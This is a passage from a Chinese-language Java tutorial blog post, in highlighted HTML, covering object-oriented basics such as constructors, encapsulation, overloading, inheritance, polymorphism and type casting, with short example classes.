punctuation">,</span> array1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将array1复制进array3，此时array3为{1, 2, 3}</span>System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>array2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> array3<span class="token punctuation">,</span> array1<span class="token punctuation">.</span>length<span class="token punctuation">,</span> array2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//接着array3的尾部将array2复制进array3，此时array3为{1, 2, 3, 4, 5, 6}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p><strong>以类的方式组织代码，以对象的方式封装数据。</strong></p><p><img src="image-20210711104734262.png" alt="image-20210711104734262"></p><h2 id="调用-1"><a href="#调用-1" class="headerlink" title="调用"></a>调用</h2><h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><p><strong>静态对象可全局直接调用</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo01</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"这是静态调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h3><p><strong>静态方法调用动态对象需要先实例化类，这个类可以是包含此对象的类本身</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo01</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//静态</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//动态</span>        Demo01 demo01 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>demo01<span class="token punctuation">.</span><span class="token function">doc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"这是静态调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> String <span class="token function">doc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"这是动态调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>同一类中，动态方法调用动态对象直接调用</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo01</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Demo01 demo01 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>demo01<span class="token punctuation">.</span><span class="token function">doc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>demo01<span class="token punctuation">.</span><span class="token function">doca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"这是静态调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">doc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"这是静态方法调用动态对象"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//动态调用动态</span>    <span class="token keyword">public</span> String <span class="token function">doca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">docb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">docb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"这是动态方法调用动态对象"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210711112048470.png" alt="image-20210711112048470"></p><h3 id="实例变量调用"><a href="#实例变量调用" class="headerlink" title="实例变量调用"></a>实例变量调用</h3><p><strong>同一类中调用实例对象，用this指向本身</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo02</span> <span class="token punctuation">{</span>    String a <span class="token operator">=</span> <span class="token string">"这是一个实例对象"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        String b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">;</span>        <span class="token keyword">return</span> b<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210711115512993.png" alt="image-20210711115512993"></p><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p><strong>即使一个类什么都不写，也会存在一个方法，这个方法与类同名，称为构造器</strong></p><ul><li><p><strong>new一个对象，本质是调用构造器</strong></p></li><li><p>一但定义有参构造，就一定要显示无参构造（无参构造默认不显示）</p></li><li><p>必须和类名称相同</p></li><li><p>不能有返回值，包括void</p></li></ul><h3 id="构造器实例化初始值"><a href="#构造器实例化初始值" class="headerlink" title="构造器实例化初始值"></a>构造器实例化初始值</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo03</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Demo03</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>a  <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="有参构造"><a href="#有参构造" class="headerlink" title="有参构造"></a>有参构造</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//构造器</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo03</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Demo03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//有参构造必须显示无参</span>    <span class="token keyword">public</span> <span class="token function">Demo03</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//main调用输出</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Demo03 demo03 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo03</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>demo03<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210711142722986-1625984843965.png" alt="image-20210711142722986"></p><h3 id="对象内存分析"><a href="#对象内存分析" class="headerlink" title="对象内存分析"></a>对象内存分析</h3><p><img src="image-20210711161713587.png" alt="image-20210711161713587"></p><p><img src="image-20210711163816749.png" alt="image-20210711163816749"></p><p><strong>对象</strong>：对象是类的一个实例（<strong>对象不是找个女朋友</strong>），有状态和行为。</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/12/20210105-java-object-1.png" alt="img"></p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装的优点</p><p><img src="image-20210711165329078.png" alt="image-20210711165329078"></p><p><strong>这里统一接口，是因为默认获取值使用getName(),修改（设置）值使用setName(),这样就达成了接口的统一</strong></p><p><strong>快捷键：ALT+INS</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 封装 <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//属性私有化</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>     <span class="token keyword">private</span> String sex<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//提供接口，获取数据为get,修改为set</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//this用于调用当前类中的属性</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        封装 fenzhuang <span class="token operator">=</span> <span class="token keyword">new</span> 封装<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fenzhuang<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//外部传值修改</span>        fenzhuang<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Atmujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fenzhuang<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取类中的属性</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fenzhuang<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210717100658600.png" alt="image-20210717100658600"></p><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><p>但一个方法需要处理多个不同类型的数据时，要用到重载</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token function">Scanner</span><span class="token punctuation">(</span>Readable source<span class="token punctuation">,</span> Pattern pattern<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">assert</span> source <span class="token operator">!=</span> null <span class="token operator">:</span> <span class="token string">"source should not be null"</span><span class="token punctuation">;</span>        <span class="token keyword">assert</span> pattern <span class="token operator">!=</span> null <span class="token operator">:</span> <span class="token string">"pattern should not be null"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>source <span class="token operator">=</span> source<span class="token punctuation">;</span>        delimPattern <span class="token operator">=</span> pattern<span class="token punctuation">;</span>        buf <span class="token operator">=</span> CharBuffer<span class="token punctuation">.</span><span class="token function">allocate</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token punctuation">.</span><span class="token function">limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        matcher <span class="token operator">=</span> delimPattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        matcher<span class="token punctuation">.</span><span class="token function">useTransparentBounds</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        matcher<span class="token punctuation">.</span><span class="token function">useAnchoringBounds</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">useLocale</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span>Category<span class="token punctuation">.</span>FORMAT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Constructs a new {@code Scanner} that produces values scanned     * from the specified source.     *     * @param  source A character source implementing the {@link Readable}     *         interface     */</span>    <span class="token keyword">public</span> <span class="token function">Scanner</span><span class="token punctuation">(</span>Readable source<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>Objects<span class="token punctuation">.</span><span class="token function">requireNonNull</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">"source"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> WHITESPACE_PATTERN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Constructs a new {@code Scanner} that produces values scanned     * from the specified input stream. Bytes from the stream are converted     * into characters using the underlying platform's     * {@linkplain java.nio.charset.Charset#defaultCharset() default charset}.     *     * @param  source An input stream to be scanned     */</span>    <span class="token keyword">public</span> <span class="token function">Scanner</span><span class="token punctuation">(</span>InputStream source<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">,</span> WHITESPACE_PATTERN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是典型的重载，简单说就是方法名相同，形参类型不同是java允许的</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><strong>使用<code>extends</code>继承父类，子类/派生类继承父类的所有方法</strong> </p><p><strong>private 属性不会被继承</strong></p><p><strong>final 修饰的类不能继承</strong></p><p><strong>所有类默认继承Object类</strong> </p><p><strong>java只有单继承，没有多继承</strong></p><ul><li><p>修饰符</p><blockquote><p>public 公共的</p><p>private 私有的</p><p>protected 受保护的</p><p>default 默认 （可不写）</p></blockquote></li></ul><h4 id="super"><a href="#super" class="headerlink" title="super"></a>super</h4><p>正如访问类本身的属性/方法需要使用<code>this.属性名/方法名</code>,在继承父类之后，子类调用父类的属性/方法需要使用<code>super.属性名/方法名</code></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 封装 <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">protected</span> String sex <span class="token operator">=</span> <span class="token string">"女"</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是父类的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> oop<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 继承 <span class="token keyword">extends</span> 封装<span class="token punctuation">{</span>    <span class="token keyword">private</span> String sex <span class="token operator">=</span> <span class="token string">"男"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是子类的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sys</span><span class="token punctuation">(</span>String sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里调用的是传入的实际参数</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里调用继承类本身的属性</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里调用父类的属性</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//直接调用</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里调用继承了本身的方法</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里调用父类的方法</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        继承 jc <span class="token operator">=</span> <span class="token keyword">new</span> 继承<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jc<span class="token punctuation">.</span><span class="token function">sys</span><span class="token punctuation">(</span><span class="token string">"人妖"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210717163709272.png" alt="image-20210717163709272"></p><h4 id="构造方法的调用"><a href="#构造方法的调用" class="headerlink" title="构造方法的调用"></a>构造方法的调用</h4><p>构造方法，可直接用<code>this()</code>和<code>super()</code>调用，但要写在无参构造中，不写亦可，继承时会自动调用</p><p><img src="image-20210717163853331.png" alt="image-20210717163853331"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> oop<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 封装 <span class="token punctuation">{</span>    <span class="token keyword">public</span> 封装<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是父类构造器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">package</span> oop<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 继承 <span class="token keyword">extends</span> 封装<span class="token punctuation">{</span>    <span class="token keyword">public</span> 继承<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用父类构造器</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><p>重写是方法的重写，与属性无关</p><p><img src="image-20210717165155335.png" alt="image-20210717165155335"></p><p>父类的引用可以指向子类</p><p><strong>注：静态方法和私有方法没有重写</strong></p><p><strong>方法的调用只和类型有关</strong></p><p><img src="image-20210717165549899.png" alt="image-20210717165549899"></p><p>非静态方法子类重写了父类的方法</p><p><img src="image-20210717172437056.png" alt="image-20210717172437056"></p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p><strong>父类的引用可以指向子类</strong></p><p><strong>对象的实际类型是确定的，但指向的类型是不确定的</strong></p><p>父类指向子类</p><ul><li>可以调用父类方法</li><li>不能调用子类独有的方法</li><li>子类重写方法，调用重写后的方法</li></ul><p><strong>简单来说：父类型调用子类方法，是在调用子类继承并重写后的方法</strong></p><p><img src="image-20210717174408823.png" alt="image-20210717174408823"></p><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><p><img src="image-20210717175619338.png" alt="image-20210717175619338"></p><p><strong><code>instanceof</code>用于判断两个类是否有关（继承）</strong></p><h3 id="类型转化"><a href="#类型转化" class="headerlink" title="类型转化"></a>类型转化</h3><p>类的类型转化同变量的转化</p><p>高–&gt;低：强制转化</p><p>低–&gt;高：自动转化</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 继承 <span class="token keyword">extends</span> 封装<span class="token punctuation">{</span>    <span class="token keyword">private</span> String sex <span class="token operator">=</span> <span class="token string">"男"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> String abcd <span class="token operator">=</span> <span class="token string">"110吗，这有程序员想当黑客"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//父类封装是高，子类继承是低</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    封装 fz <span class="token operator">=</span> <span class="token keyword">new</span> 继承<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//子类继承转化为父类封装，自动转化，也称为多态</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>继承<span class="token punctuation">)</span>fz<span class="token punctuation">)</span><span class="token punctuation">.</span>abcd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//父类要调用子类独有的属性，要强制转化</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>子类转化父类，会丢失自己独有的方法</strong></p><h4 id="静态方法static"><a href="#静态方法static" class="headerlink" title="静态方法static"></a>静态方法static</h4><p><strong>static无法重写，被动态调用的直接原因是：</strong></p><p><strong>static和类一起加载，优先级很高，它加载时其他属性方法都没有被加载，所以无法直接调用</strong></p><h4 id="java执行顺序"><a href="#java执行顺序" class="headerlink" title="java执行顺序"></a>java执行顺序</h4><p><strong>静态代码块  –&gt;  匿名代码块 –&gt;  构造函数  –&gt;  方法</strong> 【静态和类一同加载】</p><p><strong>静态代码块整个程序运行中只执行一次</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> oop<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 测试 <span class="token punctuation">{</span>    <span class="token keyword">public</span> 测试<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token 